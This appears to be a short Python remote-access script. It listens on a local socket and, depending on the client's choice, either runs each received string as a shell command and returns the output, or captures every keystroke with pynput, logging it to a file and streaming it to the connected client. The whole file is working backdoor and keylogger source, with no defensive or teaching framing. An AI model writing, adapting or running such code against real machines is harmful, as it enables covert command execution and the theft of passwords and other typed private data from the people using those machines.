import socket
import pynput.keyboard
import subprocess
import logging
import os

from pynput import keyboard

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65432        # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        choice = conn.recv(1024)
        if(int(choice.decode()) == 1):
            while True:
                data = conn.recv(1024)
                print(data.decode())
                output = subprocess.check_output(data.decode(), shell=True)
                conn.sendall(output)
        if(int(choice.decode()) == 2):
            logging.basicConfig(filename="log.txt", level=logging.DEBUG, format='')

            #if the key is a string then do that otherwise turn it into a string
            def get_key_name(key):
                if isinstance(key, keyboard.KeyCode): #isinstance(object,type)
                    return key.char
                else:
                    return str(key)


            def on_press(key):
                key_name = get_key_name(key)
                print('Key {} pressed.'.format(key_name))
                conn.send(key_name.encode())
                logging.log(10, key_name)
                if key_name == 'Key.esc':
                    print('Exiting...')
                    return False

            #Start Capturing keystrokes
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()